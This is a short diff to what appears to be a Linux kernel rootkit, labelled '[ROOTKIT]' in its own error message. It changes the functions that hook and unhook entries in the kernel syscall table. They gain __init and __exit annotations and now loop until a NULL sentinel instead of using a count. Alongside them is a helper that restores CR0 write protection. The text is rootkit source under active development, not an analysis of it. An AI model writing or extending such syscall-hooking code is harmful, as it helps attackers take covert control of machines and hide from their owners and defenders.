@@ -4,6 +4,7 @@
 #include <asm-generic/errno-base.h>
 #include <asm/processor-flags.h>
 #include <asm/special_insns.h>
+#include <linux/init.h>
 #include <linux/kprobes.h>
 #include <linux/printk.h>
 
@@ -46,7 +47,7 @@ static inline void protect_memory(const unsigned long ul_orig_cr0)
     cr0_write(ul_orig_cr0);
 }
 
-int init_hooking(void)
+int __init init_hooking(void)
 {
     int i_err = 0;
 
@@ -116,12 +117,12 @@ void unhook_syscall(const hook_t *const p_hook)
     set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
 }
 
-int hook_syscalls(hook_t p_hooks[], const size_t sz_count)
+int __init hook_syscalls(hook_t p_hooks[])
 {
     int i_err = 0;
     size_t i;
 
-    for (i = 0; i < sz_count; ++i) {
+    for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
         i_err = hook_syscall(&p_hooks[i]);
         IF_U (i_err) {
             pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
@@ -139,10 +140,10 @@ int hook_syscalls(hook_t p_hooks[], const size_t sz_count)
     return 0;
 }
 
-void unhook_syscalls(const hook_t p_hooks[], const size_t sz_count)
+void __exit unhook_syscalls(const hook_t p_hooks[])
 {
     size_t i;
-    for (i = 0; i < sz_count; ++i) {
+    for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
         unhook_syscall(&p_hooks[i]);
     }
 }
